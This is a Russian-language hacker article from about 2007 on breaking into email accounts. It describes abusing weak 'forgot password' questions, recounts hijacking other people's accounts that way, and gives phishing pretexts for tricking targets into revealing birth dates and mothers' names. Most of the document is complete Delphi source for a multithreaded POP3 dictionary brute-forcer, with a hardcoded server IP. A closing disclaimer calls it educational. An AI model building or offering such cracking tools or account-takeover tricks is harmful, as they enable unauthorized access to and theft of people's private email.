<h1>Технологии взлома E-mail</h1>
<div class="date">01.01.2007</div>


<div class="author">Автор: Danil</div>
<p>WEB-сайт: http://www.danil.dp.ua</p>

<p>Недавно наткнулся на прикольный форум, где собираются кардеры, спамеры и прочее. Почитал. Одна тема продвинула меня на написание этой статьи. Человек написал, что заплатит за взлом мыла. Взломать надо было не соседа Васю Непупкина, а что-то посерьезней. Было несколько отзывов. Первый поинтересовался на каком серваке расположено мыло, хотя e-mail адрес был указан. Без комментариев. Второй, даже не изучив сервак, заподозрил, что при взломе ему ничего не заплатят. Шкура неубитого медведя называется. Третий написал, что он возьмется это сделать за неделю. Дальше рассказывать не буду - уже смешно. Рассмотрим по пунктам весь этот процесс, который у некоторых "особо продвинутых" занимает неделю. Эта статья не будет похожа на описание программы с полем ввода адреса и большой кнопкой "Hack it", хотя я постараюсь сказать на эту тему как можно больше. Есть основные 4 способа взлома мыла.</p>

<p>Отсылка на атакуемое мыло сообщения, содержащего какой-то код, который после своего выполнения, позволит получить пароль или изменить его на нужный. Опять же, если мыло не соседа-собутыльника, а чего-то более серьезного, то письма получают не дырявым аутглюком и не експлорером, а почтовым клиентом с отключенным выполнением скриптов. Плюс еще их просматривают в диспечере сообщений на предмет приатаченных файлов и на серваке стоит брандмауэр, который автоматом переименовывает все прикрепленные выполняемые файлы. Облом. Только засветиться. И ничего конкретно тут пообещать нельзя.</p>
<p>Ошибки web-интерфейса сервиса для работы с почтой. В частности, подмена запросов после авторизации на своем мыле так, чтобы "вплыть" в настройки чужого. Это все уже практически везде пофиксено. Останавливаться на этом не буду.</p>
<p>Взлом самого сервака с почтовым сервисом. Т.е. надо всесторонне изучить сервер, найти на нем дырки, найти бесплатный работающий эксплоит и т.д. и т.п. Дырок может и не быть или соответствующие эксплоиты платны или не выставленны на всеобщее обозрение. Тем более, если ты взломал сервер с серьезным мылом, то нафиг тебе за копейки продавать эту инфу. Если кто-то знает как им распорядиться, то имея сервак "в кармане" ты и сам можешь об этом догадаться. Или можно продавать информацию кусками, по мере ее поступления. В любом случае, обещание по поводу недели на взлом....</p>
<p>Брутфорс. Самый тупой способ. Перебор паролей по словарю или подряд всех символов. Остановимся более подробно на этом способе. Первое, что нужно для этого, это словарь. На этом же форуме я обнаружил еще одно очень веселое объявление о продаже файла, содержащего 360000 паролей. Файл паролей можно взять где угодно. Даже просто пойти и скачать какую-нибудь программу-переводчик.</p>
<p>Теперь немного математики. Рассмотрим такой случай: пароль - не слово, а случайный набор маленьких английских символов. Для того, чтобы подобрать 2-ух буквенный пароль, по теории вероятности, надо 26*26/2=338 раз перебрать пароль. Для трехбуквенного - 26^3/2=8788, для четырехбуквенного - 26^4/2=228488 и т.д.. Тут, конечно, есть варианты. Можно сначала перебирать так: первая буква - гласная, вторая - согласная; первая - согласная, вторая - гласная. Но, если пароль состоит не только из маленьких английских букв, но и из больших, плюс цифры и спец-символы, то большой облом. Одно дело у себя локально на крутом компе подобрать пароль к excel-евскому документу, а другое дело по инету. Итак, мы определились, что прямой перебор не катит. При таком пароле, надо пробовать первые три способа.</p>

<p>Немного о безопасности. Некоторые провайдеры делают мыло так, что получить его можно только выйдя в инет через них. Проверка может быть только на диапазон адресов и есть некоторая возможность для спуфинга, но... В общем, только третий способ. Ломать прова. Взломать его за неделю - это, мягко говоря, несколько опрометчивое высказывание. Или ты уже знаешь как и тогда это происходит за пару часов, или....</p>

<p>Рассмотрим перебор по словарю. Здесь есть несколько вариантов:</p>

<p>Самый быстрый - задействовать свой полный шелл на быстром серваке. Есть несколько "но": если обнаружат, то аккаунт прикроют. Ради призрачной вероятности заработать несколько денег, рисковать полным шеллом - это сильно круто и расточительно. Использовать прокси - тоже не выход. Можно использовать вариант с каким-то уже взломанным серваком, но см.выше. Его терять еще более обидно.</p>
<p>Можно создать web-страницу c поддержкой запуска скриптов и повесить счетчик, который при каждом посещении будет перебирать несколько вариантов. Опять же, пагу могут и закрыть. Все усилия по ее раскрутке может "зачеркнуть" какой-то админ-мудак.</p>
<p>Самый безопасный, но и самый ненадежный способ - накодить спец прогу и занести ее в компьютерный клуб. При работе с инетом, она будет перебирать по чуть-чуть пароли. Потом приходишь раз в ..., и смотришь результаты. Но эту прогу надо еще написать и замаскировать - в этом клубе админы могут полными идиотами и не быть.</p>
<p>Ну и, самый распространенный способ - перебирать со своего компа. Есть целый ряд программ для этого, но все они мне, лично, не нравятся, и в этой статье я буду рассказывать, как написать брутфорсер самому.</p>
<p>На самом деле, иногда, все не так уж и безнадежно. Рассмотрим несколько реальных примеров. Вернее, я оговорился - все примеры выдуманны, все имена изменены, и любые совпадения абсолютно случайны.</p>

<p>Пример 1.</p>

<p>Зеркало. Не люблю я спамеров. Вот интересный случай: прочитал я где-то объяву о том, что представитель этой масти может заплатить за спам лист, вытащенный из какого-то сервера. Мыло его было sexxx@glukr.net. Ломанулся я на http://www.glukr.net и сразу же нажал "Забыл пароль". Служба борьбы с амнезией - очень интересная штука. Человек может указать очень сложный пароль, но правдиво, коротко и просто ответить на вопросы в интересующем нас разделе. Мне высветилось: "Ответьте на вопрос:", "sex", ясен пень - "sex". Опа. Такая приятная табличка "Установите новый пароль". Спамер остался без мыла. Для этого мне не понадобилось ничего, кроме моей любимой оперы и 2 минут времени.</p>

<p>Пример 2.</p>

<p>Идиотизм. Когда-то мне пришло письмо вроде бы от достаточно известной конторы, занимающейся безопасностью. Там было предложение заполнить резюме и выслать его на мыло с уже рассмотренного нами бесплатного, очень популярного, но такого дырявого glukr.net. Резюме было на 3-ех листах с просьбой указать ВСЮ информацию о себе. Я сразу заподозрил неладное. Или кто-то очень хотел получить обо мне всю инфу для каких-то своих "черных" замыслов и не имел ничего общего с этой конторой (что скорее всего), или в этой конторе есть очень умные люди (см. тему примера). На "Забыл пароль" у меня спросили рост. Введя пару значений, я обнаружил временную защиту, т.е. за определенный промежуток времени нельзя было вводить более двух вариантов. Рассудив, что карлик какой-то не будет отвечать на вопрос о росте, я начал со 180. Вводя по чуть-чуть цифры, к утру, я увидел такую родную сердцу табличку. Вместо того, чтобы ввести что-то типа "6 futov 1 дюйм + 2 litra пива", там было цифровое значение. Ничего я менять не стал, а то, вдруг, действительно людей на работу берут, а я потопчусь своими кроссовками рибок 46-ого размера по большому и чистому....</p>

<p>Пример 3.</p>

<p>Социальная инжененрия. На некоторых серваках на вопрос "Забыл пароль" надо указать дату рождения и, например, любимое блюдо. Казалось бы, очень сложно, но.... Надо просто открыть мыло, например, supergirl@mail.ru и послать с него открытку "Поздравляю с днем рождения" и какую-нибудь глупую подпись. Вполне возможно, что он ответит "У меня не сегодня день рождения, а 32 марта". Или послать сообщение "Мы разыгрываем 10000 видов на жительство у америкосов и Вас компьютер выбрал случайно. Укажите в обратном письме Ваше образование и дату рождения и ...". В общем, на первый взгляд, вполне безобидно. Вариантов много. Узнав его дату рождения, перебрать любимое блюдо - можно, но т.к. практически у всех есть временная защита, то тут, скорее всего, если сразу не угадал, тоже облом. Также может быть указано имя матери. Словарь из имен можно составить самому или взять на серваке с гороскопами по имени и прочей лабудой. Тут главное понять, что женских имен не так уж и много, и указывают их обычно не как "лена" или "оля", а "Елена" или "Ольга". Также следует учесть, что человеку иногда облом переключать раскладку и имя может быть в английской транскрипции.</p>

<p>Пример 4.</p>

<p>Глобальный поиск. Включить поиск по атакуемому мылу. Если это мыло присутствует на какой-нибудь доске объявлений или рассылке, то написать ему соответствующее сообщение (см. пример 3), исходя из полученных сведений. Также пароль в какой-нибудь форум или чат получить иногда гораздо легче, и в большинстве случаев он от пароля на мыло не отличается.</p>

<p>Пример 5.</p>

<p>Навороты web-сайта. На сервере одного прова обнаружил голосование, с просмотром результатов. Результаты вызывались через url, в котором указывался один из параметров - куда после этого перейти. С соответствующими правами. Гении программирования, мля. Там еще был дополнительный web-интерфейс для работы с почтой. В корень выйти не получилось, но сходив к ним, потратив несколько баксов на диалап и мыло, просканировав сервак на предмет установленного почтового сервиса и поэксперементировав с купленным мылом, я понял, почему некоторые жаловались на то, что по 5-ти часовой карточке у них больше 2-ух часов не работаешь и кто-то периодически читает у этого прова все мыло. Но это тема отдельного разговора. Кстати, нужный мне пароль оказался "qwerty". Обычно, первое слово в большинстве словарей.</p>

<p>Рассмотрим способы защиты службы борьбы с амнезией. Первый - временная защита (кстати, на mail.xakep.ru я ее не обнаружил, хотя может не там смотрел). Второе - указывать любимое блюдо не "Пиво" и рост - не "215". Таким образом, в большинстве случаев способ "Забыл пароль" не действует. Теперь рассмотрим вариант, при котором человек не должен догадываться, что его мыло читают, т.е. даже подбор "Забыл пароль" не катит. Перейдем непосредственно к исследованиям и кодингу. Я не буду рассматривать написание брутфорса на перл для работы на удаленном сервере - это есть на http://www.xakep.ru. Рассмотрим написание брутфорса на Delphi, с использованием функций WinAPI для работы с сокетом. Переписать на перл, си или асм потом проблем нет никаких - оно все отличается только синтаксисом вызова функций. Также потребуется какой-нибудь telnet-клиент, port-mapper или tcp-logger для исследования ответов сервера.</p>

<p>POP3. 110 порт. Интересующие нас команды - "user" и "pass". Предположим, что надо подобрать пароль на freemail.ukr.net у пользователя dndanil (это мой - специально для экспериментов). Ломанемся по телнету на freemail.ukr.net:110 и введем "user dndanil". Потом "pass password". Посмотрим ответы. Если после оценки скорости желание не отпало, то надо написать прогу, которая будет коннектится к серваку и перебирать пароли с отслеживанием ошибок. Прогу будем писать с учетом продвинутых технологий при создании различных сканеров - многопоточность, т.е. перебирать пароли будут сразу несколько процессов. Так, вроде, быстрей. Для этого надо ввести класс, описывающий наш процесс. Кол-во одновременно запущенных процессов зависит от железа и скорости соединения с инетом. Для перебора будем использовать файл с паролями, который загрузим в TStringList (список строк). Итак, создадим для наглядности окно и влепим туда кнопку "Hack it" :-) и ProgressBar с Win32. Вот исходники с комментариями брутфорсера для POP3-сервера:</p>

<pre>
unit Unit1;
 
interface
 
uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ComCtrls, StdCtrls, WinSock;
 
type
  TForm1 = class(TForm)
    Button1: TButton;
    ProgressBar1: TProgressBar;
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
end;
 
// Описание процесса
type
  TScan = class(TThread)
    sock2 : TSocket;
    addr:TSockAddrIn;
    WSAData : TWSAData;
  private
    procedure CScan;
  protected
    procedure Execute; override;
end;
 
var
  Form1: TForm1;
  // Массив процессов
  Sock : array[1..255] of TScan;
  Rez : boolean = false;
  // Кол-во запущенных процессов на данный момент
  I0 : Integer;
  // Номер текущего пароля
  I : Integer;
  // TStringList с паролями
  PassList : TStringList;
 
 
const
  FilePass = 'pass.txt'; // Файл с паролями в каталоге проги
  ProcCount = 10; // кол-во процессов
  POP3serv = '212.42.64.13'; // POP3 server (отпингованый)
  User = 'dndanil';
 
implementation
{$R *.DFM}
 
procedure TForm1.FormCreate(Sender: TObject);
begin
  PassList:=TStringList.Create;
end;
 
// Запуск / Остановка
procedure TForm1.Button1Click(Sender: TObject);
begin
  if Rez then
    Rez:=false
  else
  begin
    // Открытие и загрузка файла паролей
    try
      PassList.Clear;
      PassList.LoadFromFile(FilePass);
    except
    end;
    if PassList.Count&lt;=0 then
    begin
      Application.MessageBox('Файл паролей не найден или его нельзя использовать', 'ERROR', mb_Ok);
      exit;
    end;
    Form1.Button1.Caption:='Stop';
    Form1.ProgressBar1.Position:=0;
    // Кол-во паролей
    Form1.ProgressBar1.Max:=PassList.Count;
    Application.ProcessMessages;
    I:=0;
    I0:=1;
    Rez:=true;
    // Запустить все процессы
    while true do
    begin
      Sock[I0]:=TScan.Create(false);
      inc(I0); // Подсчитать их кол-во
      //Выйти если больше указанного, или стоп, или подобрали
      if (I0&gt;ProcCount)or(not Rez) then
        break;
    end;
  end;
end;
 
// Проца инициализации процесса
procedure TScan.Execute;
begin
  try
    // Запуск цикла
    while true do
    begin
      CScan;
      //Выход, если подобрали или закончился словарь
      if (not Rez)or(I&gt;=PassList.Count) then
        break;
    end;
  except
  end;
  dec(I0);
  try
    Terminate;
  except
  end;
  //Если все процессы прерваны -
  if I0&lt;=1 then
  begin
    Form1.Button1.Caption:='Hack it';
    Rez:=false;
    Application.ProcessMessages;
  end;
end;
 
//Проца сканирования
procedure TScan.CScan;
var
  iaddr, x, I2 : Integer;
  Buf : array [1..255] of Char;
 
  //Отправка
  procedure sender(str:string);
  var
    I1: integer;
  begin
    for I1:=1 to Length(str) do
      if send(sock2, str[I1] , 1, 0) = SOCKET_ERROR then
        exit;
  end;
 
begin
  I2:=I;
  inc(I);
  Form1.ProgressBar1.Position:=I2+1;
  Application.ProcessMessages;
  try
    // Инициализация сокета
    WSAStartUp(257, WSAData);
    sock2:=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
    if sock2=INVALID_SOCKET then
    begin
      try
        closesocket(sock2);
      except
      end;
      exit;
    end;
    //Адрес сервака
    iaddr := inet_addr(PChar(POP3serv));
    if iaddr &lt;=0 then
    begin
      try
        closesocket(sock2);
      except
      end;
      exit;
    end;
    addr.sin_family := AF_INET;
    // Порт сервака
    addr.sin_port := htons(110);
    addr.sin_addr.S_addr:=iaddr;
    if (connect(sock2, addr, sizeof(addr))) &gt;0 then
    begin
      try
        closesocket(sock2);
      except
      end;
      exit;
    end;
    //Получение при соединении
    x:=recv(sock2,buf,sizeof(Buf),0);
    if (x=SOCKET_ERROR)or(buf[1]&lt;&gt;'+') then
      exit;
    //"user user"
    sender('user '+User+#13+#10);
    x:=recv(sock2,buf,sizeof(Buf),0);
    if (x=SOCKET_ERROR)or(buf[1]&lt;&gt;'+') then
      exit;
    //"pass password"
    sender('pass '+PassList.Strings[I2]+#13+#10);
    x:=recv(sock2,buf,sizeof(Buf),0);
    //Если подобралось
    if (x&gt;3)and(buf[1]='+') then
    begin
      Rez:=false;
      Application.MessageBox(PChar('Pass = '+PassList.Strings[I2]),'ENJOY',mb_Ok);
      exit;
    end;
    try
      closesocket(sock2);
    except
    end;
  except
  end;
end;
 
end.
</pre>




<p>Адрес сервака перед использованием надо отпинговать (ping -a freemail.ukr.net) и ввести IP. Кол-во процессов подбирается исходя из железа. Это рабочий скелет брутфорсера, хоть и написан за пару часов. При проверке, я создал файл-словарь, размером 1000 паролей и 666-ым шел мой настоящий пароль. При одном процессе я задолбался ждать. При кол-ве процессов 255, уже через 15 минут (на диалап), мне высветился мой пароль. На шелле, аналогичная конструкция на перл, заняла примерно столько же времени. Но это на 666-ом пароле, а на 1000000-ом я бы ждал очень долго. Поэтому этот способ обладает очень призрачными шансами что-либо подобрать и годится только для очень простых паролей.</p>

<p>P.S. В следующей статье я напишу, как исследовать web-интерфейс для работы с почтой, написать брутфорс, подбирающий на нем пароли (кстати, будет рассмотрен mail.xakep.ru), и подведу общие итоги.</p>

<p>P.P.S. Статья и программа предоставлена в целях обучения и вся ответственность за использование ложится на твои хилые плечи.</p><p>Взято с <a href="https://delphiworld.narod.ru" target="_blank">https://delphiworld.narod.ru</a></p>

